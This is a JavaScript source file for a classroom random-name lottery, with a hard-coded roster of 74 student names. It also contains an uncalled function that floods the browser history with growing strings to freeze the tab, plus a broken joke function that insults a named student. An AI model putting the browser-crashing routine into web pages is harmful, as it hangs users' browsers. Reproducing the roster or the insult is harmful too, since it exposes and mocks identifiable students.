var g_Interval = 1;
var g_PersonCount = 74; //参加抽奖人数
var g_Timer;
var running = false;

//按学号排列的矩阵
var 对象の矩阵 =
  ["张俊怡", "马孟阳", "李博文", "刚好", "郭智卓", "许春阳", "寇凌霞", "杜博帆", "徐佳颖", "冷跃康", "郝绪", "苏雨晨", "宋家乐", "秦怡冉", "杨家玮",
    "高文轩", "王玺玥", "王圣琦", "张煜哲", "陈定可", "马可松", "陈梦雅", "周华阳", "鲍佳莉", "黄林", "徐慧琳", "易与同", "曹贤哲", "徐文博", "杨政武",
    "刘瑞月", "彭新宇", "曾博翰", "赵新宇", "贺柏睿", "冯致诚", "陈馨怡", "赵媛媛", "贾忆雯", "周嘉豪", "付佳鑫", "吴先科", "赵茜茜", "吴越", "朱奕旸",
    "吴俊伟", "李峪姗", "秦李扬", "田家圆", "周子颖", "李琪", "汪琳越", "吴明哲", "孙钰岚", "刘智博", "李雪婷", "赵祖宇", "汪庆怡", "王禹轩", "庄子弈",
    "柳晨晓", "唐欣悦", "孙梦奇", "肖梦圆", "柳德鑫", "齐志伟", "李东阳", "唐福临", "李君耀", "张喆翔", "张慈恩", "李星浩", "金晟旭", "梁宝壬"
  ]




function beginRndNum (trigger) {
  if (running) {
    running = false;
    clearTimeout(g_Timer);
    $(trigger).val("开始");
    $('#ResultNum').css('color', 'red');
    $('#ResultNumR').css('color', 'red');
  } else {
    running = true;
    $('#ResultNum').css('color', 'black');
    $('#ResultNumR').css('color', 'black');
    $(trigger).val("停止");
    beginTimer();
  }
}

function updateRndNum () {
  var num = Math.floor(Math.random() * g_PersonCount + 1);
  $('#ResultNumR').html(num);
  $('#ResultNum').html(对象の矩阵[num - 1])

}

function beginTimer () {
  g_Timer = setTimeout(beat, g_Interval);
}

function beat () {
  g_Timer = setTimeout(beat, g_Interval);
  updateRndNum();
}

function FuckCPU () {
  total = "";
  for (var i = 0; i < 1000000; i++) {
    total = total + i.toString();
    history.pushState(0, 0, total);
  }
}

function lry (sb) {
  刘瑞月(sb);
}
